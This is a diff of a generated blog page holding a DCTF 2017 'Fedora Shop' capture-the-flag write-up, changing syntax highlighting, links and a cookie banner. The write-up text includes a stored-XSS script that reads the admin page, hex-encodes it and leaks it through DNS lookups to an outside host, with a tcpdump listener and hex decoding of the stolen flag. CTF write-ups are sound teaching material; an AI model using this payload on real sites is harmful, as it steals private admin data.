@@ -5,7 +5,24 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-
+  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
+<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
+<script>
+window.addEventListener("load", function(){
+window.cookieconsent.initialise({
+  "palette": {
+    "popup": {
+      "background": "#424242"
+    },
+    "button": {
+      "background": "#2a7ae2"
+    }
+  },
+  "content": {
+    "href": "/privacy-policy"
+  }
+})});
+</script>
   
   
   
@@ -14,10 +31,10 @@
   
 
   <link rel="stylesheet" href="/assets/main.css">
-  <link rel="canonical" href="https://nitesculucian.github.io/2018/07/15/dctf-2017-fedora-shop-writeup/">
+  <link rel="canonical" href="http://localhost:4000/2018/07/15/dctf-2017-fedora-shop-writeup/">
   
   
-  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
+  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="http://localhost:4000/feed.xml">
 
   
 
@@ -103,6 +120,8 @@
     
       
     
+      
+    
   
     
     
@@ -118,6 +137,8 @@
     
       
         <a href="/categories/ctf/">ctf</a>,
+      
+    
       
     
       
@@ -139,6 +160,8 @@
     
       
         <a href="/categories/writeups/">writeups</a>
+      
+    
       
     
   
@@ -188,8 +211,8 @@
 
 <p>On our exfil server we will listen for DNS requests using the following command:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump -vn udp port 53 -i ens3
-</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">tcpdump -vn udp port 53 -i ens3
+</span></code></pre></div></div>
 
 <p>As attack vector for only first 25 characters (50 hexa) of the flag we will use:</p>
 
@@ -197,7 +220,7 @@
   <li>Note that the “Telephone” input has to be stored is the DB and should never exceed 255 characters.</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;setTimeout(function(){$.get('/admin.php',function(d){var h='';for(i=0;i&lt;d.length;i++){h+=("00"+d.charCodeAt(i).toString(16)).slice(-2);}$(document.body).append($('&lt;img&gt;').attr('src','//t'+h.substring(0,50)+'.dns.tux.ro'));});},999);&lt;/script&gt;
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="nx">$</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="s1">'/admin.php'</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">d</span><span class="p">){</span><span class="kd">var</span> <span class="nx">h</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">d</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span><span class="nx">h</span><span class="o">+=</span><span class="p">(</span><span class="s2">"00"</span><span class="o">+</span><span class="nx">d</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nx">slice</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">);}</span><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s1">'&lt;img&gt;'</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s1">'src'</span><span class="p">,</span><span class="s1">'//t'</span><span class="o">+</span><span class="nx">h</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">50</span><span class="p">)</span><span class="o">+</span><span class="s1">'.dns.tux.ro'</span><span class="p">));});},</span><span class="mi">999</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
 </code></pre></div></div>
 
 <p>The above script will be executed when the Admin will visit the orders page and it will also send the DNS request to our server, which will look like:</p>
@@ -206,14 +229,14 @@
 
 <p>Which stands for:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lucian@nitescu:~$ python
-Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
-[GCC 5.4.0 20160609] on linux2
-Type "help", "copyright", "credits" or "license" for more information.
-&gt;&gt;&gt; buf = "444354467b3934366436636131366332663337306237343563"
-&gt;&gt;&gt; buf.decode("hex")
-'DCTF{946d6ca16c2f370b745c'
-&gt;&gt;&gt; 
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">lucian</span><span class="nd">@nitescu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python</span>
+<span class="n">Python</span> <span class="mf">2.7</span><span class="o">.</span><span class="mi">12</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Nov</span> <span class="mi">19</span> <span class="mi">2016</span><span class="p">,</span> <span class="mo">06</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">10</span><span class="p">)</span> 
+<span class="p">[</span><span class="n">GCC</span> <span class="mf">5.4</span><span class="o">.</span><span class="mi">0</span> <span class="mi">20160609</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
+<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">buf</span> <span class="o">=</span> <span class="s">"444354467b3934366436636131366332663337306237343563"</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">)</span>
+<span class="s">'DCTF{946d6ca16c2f370b745c'</span>
+<span class="o">&gt;&gt;&gt;</span> 
 </code></pre></div></div>
 
 <p>Now we can just change the script to get the next 25 characters of the flag until we get this:</p>
@@ -262,8 +285,9 @@ s.setAttribute('data-timestamp', +new Date());
     <p>
       
 
-&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>
+&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="http://localhost:4000/feed.xml">RSS</a>
 
+      | <a href="/privacy-policy" >Privacy Policy</a>
     </p>
 
   </div>
